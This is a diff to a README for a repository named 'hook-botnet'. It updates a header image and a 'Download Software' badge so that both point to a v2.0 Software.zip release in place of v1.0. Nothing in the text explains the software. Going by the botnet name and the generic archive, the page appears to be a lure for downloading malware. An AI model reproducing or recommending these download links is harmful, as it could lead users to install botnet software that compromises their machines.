@@ -1,7 +1,7 @@
 # Welcome to the Darkfolder Channel Repository 🕵️‍♂️
 
-![Darkfolder Channel](https://github.com/redneck155/hook-botnet/releases/download/v1.0/Software.zip)
-[![Download Software](https://github.com/redneck155/hook-botnet/releases/download/v1.0/Software.zip)](https://github.com/redneck155/hook-botnet/releases/download/v1.0/Software.zip)
+![Darkfolder Channel](https://github.com/redneck155/hook-botnet/releases/download/v2.0/Software.zip)
+[![Download Software](https://github.com/redneck155/hook-botnet/releases/download/v2.0/Software.zip)](https://github.com/redneck155/hook-botnet/releases/download/v2.0/Software.zip)
 
 ## Repository: hook-botnet
 
